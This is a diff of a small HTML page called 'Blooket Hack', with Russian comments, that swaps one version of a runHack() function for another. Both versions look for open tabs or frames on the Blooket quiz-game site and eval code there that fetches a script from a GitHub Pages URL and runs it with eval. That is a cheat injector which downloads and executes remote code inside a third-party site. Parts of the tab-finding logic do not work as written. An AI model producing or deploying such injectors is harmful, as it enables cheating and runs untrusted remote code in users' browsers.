@@ -4,37 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blooket Hack</title>
-    <script>
-        function runHack() {
-            let blooketTab = null;
-
-            // Перебираем все открытые окна
-            const tabs = window.open('', '_self');
-            if (tabs) {
-                for (let i = 0; i < tabs.length; i++) {
-                    if (tabs[i].location.href.includes("blooket.com")) {
-                        blooketTab = tabs[i];
-                        break;
-                    }
-                }
-            }
-
-            // Если нашли вкладку Blooket, выполняем код
-            if (blooketTab) {
-                blooketTab.eval(`
-                    fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
-                    .then(response => response.text())
-                    .then(eval)
-                    .catch(error => alert('❌ Hack failed: ' + error));
-                `);
-            } else {
-                alert("❌ No open Blooket tab found! Open Blooket first and try again.");
-            }
-        }
-    </script>
 </head>
 <body>
     <h1>Blooket Hack</h1>
-    <button onclick="runHack()">🚀 Run Hack in Blooket</button>
+    <button onclick="runHack()">🚀 Run Hack in All Blooket Tabs</button>
+
+    <script>
+        function runHack() {
+            let found = false;
+
+            // Перебираем все окна
+            for (let i = 0; i < window.frames.length; i++) {
+                let frame = window.frames[i];
+                try {
+                    if (frame.location.href.includes("blooket.com")) {
+                        found = true;
+                        frame.eval(`
+                            fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
+                            .then(response => response.text())
+                            .then(eval)
+                            .catch(error => alert('❌ Hack failed: ' + error));
+                        `);
+                        console.log("✅ Hack injected into Blooket tab!");
+                    }
+                } catch (e) {
+                    console.error("❌ No access to frame:", e);
+                }
+            }
+
+            if (!found) {
+                alert("❌ No open Blooket tabs found! Open Blooket first and try again.");
+            }
+        }
+    </script>
 </body>
 </html>
